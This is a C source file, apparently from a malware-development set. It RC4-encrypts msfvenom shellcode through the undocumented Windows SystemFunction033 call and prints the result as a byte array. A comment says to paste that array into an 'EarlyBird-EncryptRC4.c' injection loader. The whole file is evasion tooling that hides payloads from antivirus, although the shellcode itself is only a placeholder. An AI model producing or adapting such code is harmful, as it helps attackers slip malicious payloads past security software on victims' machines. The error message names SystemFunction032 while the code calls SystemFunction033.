#include <Windows.h>
#include <stdio.h>

typedef struct{
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
}USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction033)(
    USTRING* Data,
    USTRING* Key
);


BOOL Rc4EncryptionViaSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS STATUS	= 0;
	
	USTRING Data = { 
		.Buffer         = pPayloadData,
		.Length         = sPayloadSize,
		.MaximumLength  = sPayloadSize
	};

	USTRING	Key = {
		.Buffer         = pRc4Key,
		.Length         = dwRc4KeySize,
		.MaximumLength  = dwRc4KeySize
	};

	fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction033");

	if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}


int main(){

  // Key: randomkey -> {0x72, 0x61, 0x6E, 0x64, 0x6F, 0x6D, 0x6B, 0x65, 0x79}
  unsigned char key[] = {0x72, 0x61, 0x6E, 0x64, 0x6F, 0x6D, 0x6B, 0x65, 0x79};
  unsigned char Shellcode[] = {"Your Shellcode Msfvenom..."};

  // Encrypt 
  Rc4EncryptionViaSystemFunc033(key, Shellcode, sizeof(key), sizeof(Shellcode));

  // Copy Bytes Encrypted into EarlyBird-EncryptRC4.c
  printf("unsigned char Shellcode[] = {\n\t");
  for(int i = 0; i < sizeof(Shellcode); i++){
      printf("0x%02x,", Shellcode[i]);
      if((i+1) % 15 == 0) printf("\n\t");
    }
    printf("\n};\n");

    return 0;
}; 
